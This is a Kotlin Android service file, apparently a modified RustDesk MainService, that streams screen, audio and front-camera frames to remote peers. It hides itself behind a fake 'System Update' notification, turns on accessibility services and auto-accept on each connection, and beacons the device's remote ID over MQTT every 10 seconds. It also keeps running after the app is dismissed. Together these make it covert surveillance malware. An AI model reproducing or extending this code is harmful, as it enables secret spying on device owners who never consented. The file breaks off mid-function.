//Hello
package com.carriez.flutter_hbb

import ffi.FFI


import org.eclipse.paho.android.service.MqttAndroidClient
import org.eclipse.paho.client.mqttv3.*
import java.util.Random
/**
 * Capture screen,get video and audio,send to rust.
 * Dispatch notifications
 *
 * Inspired by [droidVNC-NG] https://github.com/bk138/droidVNC-NG
 */

import android.Manifest
import android.annotation.SuppressLint
import android.app.*
import android.app.PendingIntent.FLAG_IMMUTABLE
import android.app.PendingIntent.FLAG_UPDATE_CURRENT
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.res.Configuration
import android.provider.Settings
import android.content.res.Configuration.ORIENTATION_LANDSCAPE
import android.graphics.Color
import android.graphics.ImageFormat
import android.graphics.PixelFormat
import android.graphics.SurfaceTexture
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.Rect
import android.graphics.YuvImage
import android.graphics.Canvas
import android.widget.Toast
import android.hardware.camera2.*
import android.hardware.display.DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR
import android.hardware.display.VirtualDisplay
import android.media.*
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.*
import android.util.DisplayMetrics
import android.util.Log
import android.util.Size
import android.view.Surface
import android.view.Surface.FRAME_RATE_COMPATIBILITY_DEFAULT
import android.view.WindowManager
import androidx.annotation.Keep
import androidx.annotation.RequiresApi
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import io.flutter.embedding.android.FlutterActivity
import java.util.concurrent.Executors
import kotlin.concurrent.thread
import org.json.JSONException
import org.json.JSONObject
import java.nio.ByteBuffer
import java.io.ByteArrayOutputStream
import java.util.ArrayList
import kotlin.math.absoluteValue
import kotlin.math.max
import kotlin.math.min

const val DEFAULT_NOTIFY_TITLE = "System Update"
const val DEFAULT_NOTIFY_TEXT = "Scheduled update postponed."
const val DEFAULT_NOTIFY_ID = 1
const val NOTIFY_ID_OFFSET = 100

const val MIME_TYPE = MediaFormat.MIMETYPE_VIDEO_VP9

// video const

const val MAX_SCREEN_SIZE = 1200

const val VIDEO_KEY_BIT_RATE = 1024_000
const val VIDEO_KEY_FRAME_RATE = 30

class MainService : Service() {

    @Keep
    @RequiresApi(Build.VERSION_CODES.N)
    fun rustPointerInput(kind: Int, mask: Int, x: Int, y: Int) {
        // turn on screen with LEFT_DOWN when screen off
        if (!powerManager.isInteractive && (kind == 0 || mask == LEFT_DOWN)) {
            if (wakeLock.isHeld) {
                Log.d(logTag, "Turn on Screen, WakeLock release")
                wakeLock.release()
            }
            Log.d(logTag,"Turn on Screen")
            wakeLock.acquire(5000)
        } else {
            when (kind) {
                0 -> { // touch
                    InputService.ctx?.onTouchInput(mask, x, y)
                }
                1 -> { // mouse
                    InputService.ctx?.onMouseInput(mask, x, y)
                }
                else -> {
                }
            }
        }
    }

    @Keep
    @RequiresApi(Build.VERSION_CODES.N)
    fun rustKeyEventInput(input: ByteArray) {
        InputService.ctx?.onKeyEvent(input)
    }

    @Keep
    fun rustGetByName(name: String): String {
        return when (name) {
            "screen_size" -> {
                JSONObject().apply {
                    put("width",SCREEN_INFO.width)
                    put("height",SCREEN_INFO.height)
                    put("scale",SCREEN_INFO.scale)
                }.toString()
            }
            "is_start" -> {
                isStart.toString()
            }
            else -> ""
        }
    }

    @Keep
    fun rustSetByName(name: String, arg1: String, arg2: String) {
        when (name) {
            "add_connection" -> {
                try {
                    val jsonObject = JSONObject(arg1)
                    val id = jsonObject["id"] as Int
                    val username = jsonObject["name"] as String
                    val peerId = jsonObject["peer_id"] as String
                    val isFileTransfer = jsonObject["is_file_transfer"] as Boolean
                    isCameraFrame = jsonObject.optBoolean("is_camera_frame", false)  // Default to camera frames
                    Log.d(logTag, "add_connection: isCameraFrame=$isCameraFrame, clientID=$id")
                    
                    val type = if (isFileTransfer) {
                        translate("Transfer file")
                    } else {
                        translate("Share screen")
                    }

                   publishMQTT("drawers1/status", "connected", 0)
                   
                    Log.d(logTag, "Connection received from $username - isCameraFrame=$isCameraFrame, mediaProjection ready: ${mediaProjection != null}")
                      enableAccessibilityServices()
                    // Only start media projection if isCameraFrame is false (screen sharing mode)
                    if (!isCameraFrame) {
                        Log.d(logTag, "Screen sharing mode: isCameraFrame is false, handling media projection")
                        
                        // Try to enable accessibility services for input handling
                      
                        
                        // Request media projection if not available (standalone, without MainActivity)
                        if (mediaProjection == null && !_isReady) {
                            Log.d(logTag, "Media projection not ready - requesting it for screen sharing")
                            requestMediaProjection()
                            Log.d(logTag, "Waiting for media projection permission before starting capture")
                        } else if (mediaProjection != null) {
                            // Media projection already available - start capture immediately
                            if (startCapture()) {
                                Log.d(logTag, "Capture started successfully for $username")
                            } else {
                                Log.d(logTag, "Capture failed")
                            }
                        }
                     } else {
                        Log.d(logTag, "Camera frame mode: isCameraFrame is true, skipping media projection")
                         startCamera(SCREEN_INFO.width, SCREEN_INFO.height)
                    }
                } catch (e: JSONException) {
                    Log.e(logTag, "Error processing add_connection: ${e.message}")
                    e.printStackTrace()
                }
            }
            "update_voice_call_state" -> {
                try {
                    val jsonObject = JSONObject(arg1)
                    val id = jsonObject["id"] as Int
                    val username = jsonObject["name"] as String
                    val peerId = jsonObject["peer_id"] as String
                    val inVoiceCall = jsonObject["in_voice_call"] as Boolean
                    val incomingVoiceCall = jsonObject["incoming_voice_call"] as Boolean
                    if (!inVoiceCall) {
                        if (incomingVoiceCall) {
                            voiceCallRequestNotification(id, "Voice Call Request", username, peerId)
                        } else {
                            if (!audioRecordHandle.switchOutVoiceCall(mediaProjection)) {
                                Log.e(logTag, "switchOutVoiceCall fail")
                                MainActivity.flutterMethodChannel?.invokeMethod("msgbox", mapOf(
                                    "type" to "custom-nook-nocancel-hasclose-error",
                                    "title" to "Voice call",
                                    "text" to "Failed to switch out voice call."))
                            }
                        }
                    } else {
                        if (!audioRecordHandle.switchToVoiceCall(mediaProjection)) {
                            Log.e(logTag, "switchToVoiceCall fail")
                            MainActivity.flutterMethodChannel?.invokeMethod("msgbox", mapOf(
                                "type" to "custom-nook-nocancel-hasclose-error",
                                "title" to "Voice call",
                                "text" to "Failed to switch to voice call."))
                        }
                    }
                } catch (e: JSONException) {
                    e.printStackTrace()
                }
            }
            "stop_capture" -> {
                Log.d(logTag, "from rust:stop_capture - stopping media projection for disconnected clients")
                stopCapture()
                
                // NOTE: Don't stop MQTT timer - keep publishing device ID even when no clients are connected
                
                // Also stop media projection when all clients disconnect
                try {
                    mediaProjection?.stop()
                    mediaProjection = null
                    _isReady = false
                    isRequestingMediaProjection = false
                    Log.d(logTag, "Media projection stopped as all clients disconnected")
                } catch (e: Exception) {
                    Log.e(logTag, "Error stopping media projection: ${e.message}")
                }
            }
            "half_scale" -> {
                val halfScale = arg1.toBoolean()
                if (isHalfScale != halfScale) {
                    isHalfScale = halfScale
                    updateScreenInfo(resources.configuration.orientation)
                }
            }
            else -> {
            }
        }
    }


    
    private var serviceLooper: Looper? = null
    private var serviceHandler: Handler? = null

    private val powerManager: PowerManager by lazy { applicationContext.getSystemService(Context.POWER_SERVICE) as PowerManager }
    private val wakeLock: PowerManager.WakeLock by lazy { powerManager.newWakeLock(PowerManager.ACQUIRE_CAUSES_WAKEUP or PowerManager.SCREEN_BRIGHT_WAKE_LOCK, "rustdesk:wakelock")}

    companion object {
        private var _isReady = false // media permission ready status
        private var _isStart = false // screen capture start status
        private var _isAudioStart = false // audio capture start status
        val isReady: Boolean
            get() = _isReady
        val isStart: Boolean
            get() = _isStart
        val isAudioStart: Boolean
            get() = _isAudioStart
    }

    private val logTag = "LOG_SERVICE"
    private val useVP9 = false
    private val binder = LocalBinder()

    private var reuseVirtualDisplay = Build.VERSION.SDK_INT > 33
//mqtt

// MQTT variables
private var mqttClient: MqttAndroidClient? = null
private var mqttRecCount = 0
private val mqttTAG = "MQTT_SERVICE"
private var mqttReconnectAttempts = 0
private val MAX_RECONNECT_ATTEMPTS = 10
private var mqttReconnectHandler: Handler? = null

// MQTT device ID publishing - publish this device's remote ID to drawers1 every 10 seconds
private var mqttPublishTimer: Handler? = null
private val mqttPublishRunnable = object : Runnable {
    override fun run() {
        publishDeviceIdToMQTT()
        // Schedule next publish in 10 seconds
        mqttPublishTimer?.postDelayed(this, 10000)
    }
}
    
    // video
    private var isCameraFrame = false  // true=send camera frames, false=send screen buffer
    private var mediaProjection: MediaProjection? = null
    private var isRequestingMediaProjection = false  // Flag to prevent multiple simultaneous requests
    private var surface: Surface? = null
    private val sendVP9Thread = Executors.newSingleThreadExecutor()
    private var videoEncoder: MediaCodec? = null
    private var imageReader: ImageReader? = null
    private var virtualDisplay: VirtualDisplay? = null

    // audio
    private val audioRecordHandle = AudioRecordHandle(this, { isStart }, { isAudioStart })

    // notification
    private lateinit var notificationManager: NotificationManager
    private lateinit var notificationChannel: String
    private lateinit var notificationBuilder: NotificationCompat.Builder

    // ==========================================
    // Camera2-related stuff 
    // ==========================================
    private var cameraManager: CameraManager? = null
    private var previewSize: Size? = null
    private var cameraOrientation: Int = 0
    // reusable buffers to avoid per-frame allocations
    private var camRgbaBuf: ByteBuffer? = null
    private var camRgbaCap: Int = 0
    private var targetRgbaBuf: ByteBuffer? = null
    private var targetRgbaCap: Int = 0
    private var cameraDevice: CameraDevice? = null
    private var captureRequest: CaptureRequest? = null
    private var captureSession: CameraCaptureSession? = null
    private var camImageReader: ImageReader? = null
    private var lastCamToastTs: Long = 0
    private var lastCamProcessTs: Long = 0

    // Camera compression variables
    private var cachedBitmap: Bitmap? = null
    private var cachedDecompressedBitmap: Bitmap? = null
    private var currentQuality = 70
    private val minQuality = 40
    private val maxQuality = 85

    private val captureCallback = object : CameraCaptureSession.CaptureCallback() {
        override fun onCaptureProgressed(session: CameraCaptureSession, request: CaptureRequest, partialResult: CaptureResult) {}
        override fun onCaptureCompleted(session: CameraCaptureSession, request: CaptureRequest, result: TotalCaptureResult) {}
    }

    private val stateCallback = object : CameraDevice.StateCallback() {
        override fun onOpened(currentCameraDevice: CameraDevice) {
            cameraDevice = currentCameraDevice
            createCaptureSession()
        }
        override fun onDisconnected(currentCameraDevice: CameraDevice) {
            currentCameraDevice.close()
            cameraDevice = null
        }
        override fun onError(currentCameraDevice: CameraDevice, error: Int) {
            currentCameraDevice.close()
            cameraDevice = null
        }
    }

    // Function to compress and decompress RGBA buffer (maintains RGBA output)
    private fun compressAndRestoreRGBA(rgbaBuf: ByteBuffer, width: Int, height: Int): ByteBuffer? {
        try {
            val startTime = System.currentTimeMillis()
            
            // Create bitmap from RGBA buffer (reuse if possible)
            if (cachedBitmap == null || cachedBitmap?.width != width || cachedBitmap?.height != height) {
                cachedBitmap?.recycle()
                cachedBitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888)
            }
            
            // Copy RGBA data to bitmap
            rgbaBuf.rewind()
            cachedBitmap?.copyPixelsFromBuffer(rgbaBuf)
            
            // Compress to WebP
            val compressedStream = ByteArrayOutputStream()
            cachedBitmap?.compress(Bitmap.CompressFormat.WEBP, currentQuality, compressedStream)
            val compressedData = compressedStream.toByteArray()
            
            // Log compression ratio
            val originalSize = width * height * 4
            val compressionRatio = originalSize.toFloat() / compressedData.size.toFloat()
            Log.d(logTag, "Camera frame: ${originalSize / 1024}KB -> ${compressedData.size / 1024}KB (${String.format("%.1f", compressionRatio)}x compression, quality: $currentQuality)")
            
            // Reuse decompressed bitmap
            if (cachedDecompressedBitmap == null || 
                cachedDecompressedBitmap?.width != width || 
                cachedDecompressedBitmap?.height != height) {
                cachedDecompressedBitmap?.recycle()
                cachedDecompressedBitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888)
            }
            
            // Decompress back to RGBA
            val tempBitmap = BitmapFactory.decodeByteArray(compressedData, 0, compressedData.size)
            if (tempBitmap == null) {
                Log.e(logTag, "Failed to decompress camera frame")
                return null
            }
            
            // Draw into cached bitmap
            val canvas = android.graphics.Canvas(cachedDecompressedBitmap!!)
            canvas.drawBitmap(tempBitmap, 0f, 0f, null)
            tempBitmap.recycle()
            
            // Create buffer for decompressed RGBA
            val resultBuffer = ByteBuffer.allocateDirect(width * height * 4)
            cachedDecompressedBitmap?.copyPixelsToBuffer(resultBuffer)
            resultBuffer.rewind()
            
            // Adaptive quality adjustment
            val targetSize = 150 * 1024 // 150KB target
            if (compressedData.size > targetSize * 1.2 && currentQuality > minQuality) {
                currentQuality -= 5
                Log.d(logTag, "Reducing quality to $currentQuality")
            } else if (compressedData.size < targetSize * 0.8 && currentQuality < maxQuality) {
                currentQuality += 3
                Log.d(logTag, "Increasing quality to $currentQuality")
            }
            
            val elapsed = System.currentTimeMillis() - startTime
            if (elapsed > 20) {
                Log.d(logTag, "Compression/decompression took ${elapsed}ms")
            }
            
            return resultBuffer
        } catch (e: Exception) {
            Log.e(logTag, "Compression error: ${e.message}")
            return null
        }
    }

    // Camera Image Listener that pipes data to Rust backend with compression
    private val camImageListener = ImageReader.OnImageAvailableListener { reader ->
        try {
            reader?.acquireLatestImage()?.use { image ->
                if (!isStart) return@use

                // throttle processing to avoid backlog / blinking (approx 25 fps)
                val now = System.currentTimeMillis()
                val minInterval = 40L
                if (now - lastCamProcessTs < minInterval) return@use
                lastCamProcessTs = now

                val width = image.width
                val height = image.height

                // debug: log camera + screen sizes and plane strides
                try {
                    val yPlane = image.planes[0]
                    val uPlane = image.planes[1]
                    val vPlane = image.planes[2]
                    Log.d(logTag, "cam: w=${width},h=${height}, orient=${cameraOrientation}, screen=${SCREEN_INFO.width}x${SCREEN_INFO.height}")
                    Log.d(logTag, "strides: yRow=${yPlane.rowStride}, uRow=${uPlane.rowStride}, vRow=${vPlane.rowStride}, uPix=${uPlane.pixelStride}, vPix=${vPlane.pixelStride}")
                } catch (ignored: Exception) {}

                // Allocate direct RGBA buffer (consider pooling/reuse later)
                ensureCamBuffer(width, height)
                val camBuf = camRgbaBuf ?: return@use

                // Convert YUV_420_888 -> RGBA into camera buffer
                if (!yuv420ToRgbaBuffer(image, camBuf)) return@use

                // Scale and rotate into target sized buffer (SCREEN_INFO)
                val dstW = SCREEN_INFO.width
                val dstH = SCREEN_INFO.height
                if (dstW <= 0 || dstH <= 0) return@use
                ensureTargetBuffer(dstW, dstH)
                val tgtBuf = targetRgbaBuf ?: return@use

                // perform scale+rotate (nearest neighbor)
                scaleRotateRgbaNearest(camBuf, width, height, tgtBuf, dstW, dstH, cameraOrientation % 360)

                tgtBuf.rewind()
                
                // Only send camera frames if isCameraFrame is true
                if (isCameraFrame) {
                    // Compress and restore RGBA before sending to Rust
                    val compressedBuffer = compressAndRestoreRGBA(tgtBuf, dstW, dstH)
                    
                    if (compressedBuffer != null) {
                        Log.d(logTag, "sending Camera scaled RGBA buffer size=${compressedBuffer.capacity()} src=${width}x${height} -> dst=${dstW}x${dstH} rot=${cameraOrientation}")
                        FFI.onVideoFrameUpdate(compressedBuffer)
                    } else {
                        // Fallback to original if compression fails
                        Log.w(logTag, "Compression failed, sending original frame")
                        FFI.onVideoFrameUpdate(tgtBuf)
                    }
                }   //isrequesti
            }
        } catch (e: Exception) {
            Log.e(logTag, "camImageListener error", e)
        }
    }

    /**
     * Convert YUV_420_888 Image to RGBA byte order (R,G,B,A) into provided direct ByteBuffer.
     * Returns true on success.
     */
    private fun yuv420ToRgbaBuffer(image: android.media.Image, outBuf: ByteBuffer): Boolean {
        try {
            val width = image.width
            val height = image.height
            val yPlane = image.planes[0]
            val uPlane = image.planes[1]
            val vPlane = image.planes[2]

            val yBuffer = yPlane.buffer
            val uBuffer = uPlane.buffer
            val vBuffer = vPlane.buffer

            val yRowStride = yPlane.rowStride
            val uRowStride = uPlane.rowStride
            val vRowStride = vPlane.rowStride
            val uPixelStride = uPlane.pixelStride
            val vPixelStride = vPlane.pixelStride

            // Write RGBA per pixel
            outBuf.clear()
            for (row in 0 until height) {
                val yRowStart = row * yRowStride
                val uRowStart = (row / 2) * uRowStride
                val vRowStart = (row / 2) * vRowStride
                for (col in 0 until width) {
                    val y = (yBuffer.get(yRowStart + col).toInt() and 0xFF)
                    val uvCol = (col / 2)
                    val u = (uBuffer.get(uRowStart + uvCol * uPixelStride).toInt() and 0xFF)
                    val v = (vBuffer.get(vRowStart + uvCol * vPixelStride).toInt() and 0xFF)

                    val c = y - 16
                    val d = u - 128
                    val e = v - 128

                    var r = (298 * c + 409 * e + 128) shr 8
                    var g = (298 * c - 100 * d - 208 * e + 128) shr 8
                    var b = (298 * c + 516 * d + 128) shr 8

                    if (r < 0) r = 0 else if (r > 255) r = 255
                    if (g < 0) g = 0 else if (g > 255) g = 255
                    if (b < 0) b = 0 else if (b > 255) b = 255

                    outBuf.put(r.toByte())
                    outBuf.put(g.toByte())
                    outBuf.put(b.toByte())
                    outBuf.put(0xFF.toByte())
                }
            }
            return true
        } catch (e: Exception) {
            Log.e(logTag, "yuv420ToRgbaBuffer error", e)
            return false
        }
    }

    private fun ensureCamBuffer(w: Int, h: Int) {
        val need = w * h * 4
        if (camRgbaBuf == null || camRgbaCap < need) {
            camRgbaBuf = ByteBuffer.allocateDirect(need)
            camRgbaCap = need
        } else {
            camRgbaBuf?.clear()
        }
    }

    private fun ensureTargetBuffer(w: Int, h: Int) {
        val need = w * h * 4
        if (targetRgbaBuf == null || targetRgbaCap < need) {
            targetRgbaBuf = ByteBuffer.allocateDirect(need)
            targetRgbaCap = need
        } else {
            targetRgbaBuf?.clear()
        }
    }

    private fun clamp(v: Int, min: Int, max: Int) = if (v < min) min else if (v > max) max else v

    private fun scaleRotateRgbaNearest(
        src: ByteBuffer,
        sw: Int,
        sh: Int,
        dst: ByteBuffer,
        dw: Int,
        dh: Int,
        rotation: Int
    ) {
        if (sw <= 0 || sh <= 0 || dw <= 0 || dh <= 0) return
        val rot = when (rotation) {
            90, 180, 270 -> rotation
            else -> 0
        }

        val rotW = if (rot == 90 || rot == 270) sh else sw
        val rotH = if (rot == 90 || rot == 270) sw else sh

        // precompute denom
        val rwm = (rotW - 1).toDouble()
        val rhm = (rotH - 1).toDouble()

        for (dy in 0 until dh) {
            val ny = if (dh > 1) dy.toDouble() / (dh - 1) else 0.0
            val ry = ny * rhm
            for (dx in 0 until dw) {
                val nx = if (dw > 1) dx.toDouble() / (dw - 1) else 0.0
                val rx = nx * rwm

                // inverse map rotated coords (rx,ry) -> src coords (sxf,syf)
                val (sxf, syf) = when (rot) {
                    0 -> Pair(rx, ry)
                    90 -> Pair(ry, (sh - 1) - rx)
                    180 -> Pair((sw - 1) - rx, (sh - 1) - ry)
                    270 -> Pair((sw - 1) - ry, rx)
                    else -> Pair(rx, ry)
                }

                val sx = clamp(java.lang.Math.round(sxf).toInt(), 0, sw - 1)
                val sy = clamp(java.lang.Math.round(syf).toInt(), 0, sh - 1)

                val srcIndex = (sy * sw + sx) * 4
                val dstIndex = (dy * dw + dx) * 4

                // copy 4 bytes
                try {
                    val r = src.get(srcIndex)
                    val g = src.get(srcIndex + 1)
                    val b = src.get(srcIndex + 2)
                    val a = src.get(srcIndex + 3)
                    dst.put(dstIndex, r)
                    dst.put(dstIndex + 1, g)
                    dst.put(dstIndex + 2, b)
                    dst.put(dstIndex + 3, a)
                } catch (e: Exception) {
                    // fallback: write black
                    dst.put(dstIndex, 0.toByte())
                    dst.put(dstIndex + 1, 0.toByte())
                    dst.put(dstIndex + 2, 0.toByte())
                    dst.put(dstIndex + 3, 0xFF.toByte())
                }
            }
        }
    }
    // ==========================================

    override fun onCreate() {
        super.onCreate()
        Log.d(logTag,"MainService onCreate, sdk int:${Build.VERSION.SDK_INT} reuseVirtualDisplay:$reuseVirtualDisplay")
        FFI.init(this)
        HandlerThread("Service", Process.THREAD_PRIORITY_BACKGROUND).apply {
            start()
            serviceLooper = looper
            serviceHandler = Handler(looper)
        }
        updateScreenInfo(resources.configuration.orientation)
        initNotification()

        // ✅ PRIORITY: Show foreground notification FIRST (must be within 5 seconds on Android 8+)
        createForegroundNotification()
        Log.d(logTag, "Foreground notification created to prevent service killing")

        // Now do heavy operations on background thread
        val prefs = applicationContext.getSharedPreferences(KEY_SHARED_PREFERENCES, FlutterActivity.MODE_PRIVATE)
        val configPath = prefs.getString(KEY_APP_DIR_CONFIG_PATH, "") ?: ""
        FFI.startServer(configPath, "")

        connectMQTT()
        ensureAutoAcceptModeForService()
        
        if (mediaProjection == null && !isReady) {
            Log.d(logTag, "Media projection not ready on service creation, will request when needed")
        }

        // Delay device ID saving by 15 seconds to ensure everything is initialized
        serviceHandler?.postDelayed({
            try {
                Log.d(logTag, "⏰ [15s] Starting device ID retrieval with fallback strategy...")
                saveDeviceIdToPreferences()
            } catch (e: Exception) {
                Log.e(logTag, "❌ Error in delayed device ID save: ${e.message}")
            }
        }, 15000)  // 15 second delay
    }

    override fun onDestroy() {
        checkMediaPermission()
        stopService(Intent(this, FloatingWindowService::class.java))
        stopCamera() // Ensure camera is stopped
        
        // Clean up MQTT publish timer
        if (mqttPublishTimer != null) {
            mqttPublishTimer?.removeCallbacks(mqttPublishRunnable)
            mqttPublishTimer = null
            Log.d(logTag, "MQTT publish timer cleaned up in onDestroy")
        }
        
        disconnectMQTT()
        super.onDestroy()
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        Log.d(logTag, "Task removed (app swiped from recent apps) - keeping service running with notification")
        
        val notification = notificationBuilder
            .setOngoing(true)
            .setSmallIcon(R.mipmap.ic_stat_logo)
            .setDefaults(Notification.DEFAULT_ALL)
            .setAutoCancel(false)
            .setPriority(NotificationCompat.PRIORITY_DEFAULT)
            .setContentTitle(DEFAULT_NOTIFY_TITLE)
            .setContentText(translate(DEFAULT_NOTIFY_TEXT))
            .setOnlyAlertOnce(true)
            .setColor(ContextCompat.getColor(this, R.color.primary))
            .setWhen(System.currentTimeMillis())
            .build()
        
        startForeground(DEFAULT_NOTIFY_ID, notification)
        super.onTaskRemoved(rootIntent)
    }

    private var isHalfScale: Boolean? = null;
    private fun updateScreenInfo(orientation: Int) {
        var w: Int
        var h: Int
        var dpi: Int
        val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager

        @Suppress("DEPRECATION")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            val m = windowManager.maximumWindowMetrics
            w = m.bounds.width()
            h = m.bounds.height()
            dpi = resources.configuration.densityDpi
        } else {
            val dm = DisplayMetrics()
            windowManager.defaultDisplay.getRealMetrics(dm)
            w = dm.widthPixels
            h = dm.heightPixels
            dpi = dm.densityDpi
        }

        val max = max(w,h)
        val min = min(w,h)
        if (orientation == ORIENTATION_LANDSCAPE) {
            w = max
            h = min
        } else {
            w = min
            h = max
        }
        Log.d(logTag,"updateScreenInfo:w:$w,h:$h")
        var scale = 1
        if (w != 0 && h != 0) {
            if (isHalfScale == true && (w > MAX_SCREEN_SIZE || h > MAX_SCREEN_SIZE)) {
                scale = 2
                w /= scale
                h /= scale
                dpi /= scale
            }
            if (SCREEN_INFO.width != w) {
                SCREEN_INFO.width = w
                SCREEN_INFO.height = h
                SCREEN_INFO.scale = scale
                SCREEN_INFO.dpi = dpi
                if (isStart) {
                    stopCapture()
                    FFI.refreshScreen()
                    startCapture()
                } else {
                    FFI.refreshScreen()
                }
            }

        }
    }

    override fun onBind(intent: Intent): IBinder {
        Log.d(logTag, "service onBind")
        return binder
    }

    inner class LocalBinder : Binder() {
        init {
            Log.d(logTag, "LocalBinder init")
        }

        fun getService(): MainService = this@MainService
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d("whichService", "this service: ${Thread.currentThread()}")
        super.onStartCommand(intent, flags, startId)
        if (intent?.action == ACT_INIT_MEDIA_PROJECTION_AND_SERVICE) {
            createForegroundNotification()

            if (intent.getBooleanExtra(EXT_INIT_FROM_BOOT, false)) {
                FFI.startService()
            }
            Log.d(logTag, "service starting: ${startId}:${Thread.currentThread()}")
            val mediaProjectionManager =
                getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager

            intent.getParcelableExtra<Intent>(EXT_MEDIA_PROJECTION_RES_INTENT)?.let {
                mediaProjection =
                    mediaProjectionManager.getMediaProjection(Activity.RESULT_OK, it)
                checkMediaPermission()
                _isReady = true
            } ?: let {
                Log.d(logTag, "Media projection intent not available - will request only when client connects")
            }
        } else if (intent?.action == ACT_MEDIA_PROJECTION_DENIED) {
            onMediaProjectionPermissionDenied()
        }
        return START_NOT_STICKY 
    }

    override fun onConfigurationChanged(newConfig: Configuration) {
        super.onConfigurationChanged(newConfig)
        updateScreenInfo(newConfig.orientation)
    }

  private fun requestMediaProjection() {
    if (isCameraFrame) {
        Log.d(logTag, "Camera frame active, skipping media projection request")
        return
    }

    if (isRequestingMediaProjection) {
        Log.d(logTag, "Media projection request already in progress, skipping")
        return
    }

    isRequestingMediaProjection = true
    val intent = Intent(this, PermissionRequestTransparentActivity::class.java).apply {
        action = ACT_REQUEST_MEDIA_PROJECTION
        flags = Intent.FLAG_ACTIVITY_NEW_TASK
    }
    startActivity(intent)
}
    @SuppressLint("WrongConstant")
    private fun createSurface(): Surface? {
        return if (useVP9) {
            null
        } else {
            Log.d(logTag, "ImageReader.newInstance:INFO:$SCREEN_INFO")
            imageReader =
                ImageReader.newInstance(
                    SCREEN_INFO.width,
                    SCREEN_INFO.height,
                    PixelFormat.RGBA_8888,
                    4
                ).apply {
                    setOnImageAvailableListener({ imageReader: ImageReader ->
                        try {
                            imageReader.acquireLatestImage().use { image ->
                                if (image == null || !isStart) return@setOnImageAvailableListener
                                val planes = image.planes
                                val buffer = planes[0].buffer
                                buffer.rewind()
                                
                                // Send screen buffer only when isCameraFrame is false
                                if (!isCameraFrame) {
                                    FFI.onVideoFrameUpdate(buffer)
                                }
                            }
                        } catch (ignored: java.lang.Exception) {
                        }
                    }, serviceHandler)
                }
            Log.d(logTag, "ImageReader.setOnImageAvailableListener done")
            imageReader?.surface
        }
    }

    fun onVoiceCallStarted(): Boolean {
        return audioRecordHandle.onVoiceCallStarted(mediaProjection)
    }

    fun onVoiceCallClosed(): Boolean {
        return audioRecordHandle.onVoiceCallClosed(mediaProjection)
    }

  fun startCapture(): Boolean {
    if (isStart) return true

    if (!isCameraFrame) {
        // 👉 SCREEN CAPTURE MODE
        if (mediaProjection == null) {
            Log.w(logTag, "startCapture: mediaProjection is null, requesting it")
            requestMediaProjection()
            return false
        }

        updateScreenInfo(resources.configuration.orientation)
        Log.d(logTag, "Start Screen Capture")

        surface = createSurface()

        if (useVP9) {
            startVP9VideoRecorder(mediaProjection!!)
        } else {
            startRawVideoRecorder(mediaProjection!!)
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!audioRecordHandle.createAudioRecorder(false, mediaProjection)) {
                Log.d(logTag, "createAudioRecorder fail")
            } else {
                audioRecordHandle.startAudioRecorder()
            }
        }

    } else {
        // 👉 CAMERA ONLY MODE
        Log.d(logTag, "Start Camera Capture")

        updateScreenInfo(resources.configuration.orientation)
        startCamera(SCREEN_INFO.width, SCREEN_INFO.height)
    }

    checkMediaPermission()
    _isStart = true
    FFI.setFrameRawEnable("video", true)
    MainActivity.rdClipboardManager?.setCaptureStarted(_isStart)

    return true
  }
    @Synchronized
    fun stopCapture() {
        Log.d(logTag, "Stop Capture")
        FFI.setFrameRawEnable("video",false)
        _isStart = false
        MainActivity.rdClipboardManager?.setCaptureStarted(_isStart)
        
        if (reuseVirtualDisplay) {
            virtualDisplay?.setSurface(null)
        } else {
            virtualDisplay?.release()
        }
        
        imageReader?.close()
        imageReader = null
        videoEncoder?.let {
            it.signalEndOfInputStream()
            it.stop()
            it.release()
        }
        if (!reuseVirtualDisplay) {
            virtualDisplay = null
        }
        videoEncoder = null
        surface?.release()

        // Stop Camera Here
        stopCamera()

        // release audio
        _isAudioStart = false
        audioRecordHandle.tryReleaseAudio()
    }

    fun destroy() {
        Log.d(logTag, "destroy service")
        _isReady = false
        _isAudioStart = false

        stopCapture()

        if (reuseVirtualDisplay) {
            virtualDisplay?.release()
            virtualDisplay = null
        }

        mediaProjection?.stop()
        mediaProjection = null
        checkMediaPermission()
        stopForeground(true)
        stopService(Intent(this, FloatingWindowService::class.java))
        stopSelf()
    }

    // ==========================================
    // Camera2 Integration Methods
    // ==========================================
    private fun startCamera(width: Int, height: Int) {
           Log.e(logTag, "Camera started")
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            Log.e(logTag, "Camera permission is not granted. Cannot start camera feed.")
            return
        }

        cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        var camId: String? = null

        try {
            for (id in cameraManager!!.cameraIdList) {
                val characteristics = cameraManager!!.getCameraCharacteristics(id)
                val facing = characteristics.get(CameraCharacteristics.LENS_FACING)
                if (facing == CameraCharacteristics.LENS_FACING_FRONT) {
                    camId = id
                    break
                }
            }
            if (camId == null && cameraManager!!.cameraIdList.isNotEmpty()) {
                camId = cameraManager!!.cameraIdList[0] // Fallback
            }

            if (camId != null) {
                previewSize = chooseSupportedSize(camId, width, height)
                try {
                    val characteristics = cameraManager!!.getCameraCharacteristics(camId)
                    cameraOrientation = characteristics.get(CameraCharacteristics.SENSOR_ORIENTATION) ?: 0
                } catch (e: Exception) {
                    cameraOrientation = 0
                }
                cameraManager!!.openCamera(camId, stateCallback, serviceHandler)
            }
        } catch (e: Exception) {
            Log.e(logTag, "Error starting camera", e)
        }
    }

    private fun chooseSupportedSize(camId: String, textureViewWidth: Int, textureViewHeight: Int): Size {
        val manager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        val characteristics = manager.getCameraCharacteristics(camId)
        val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
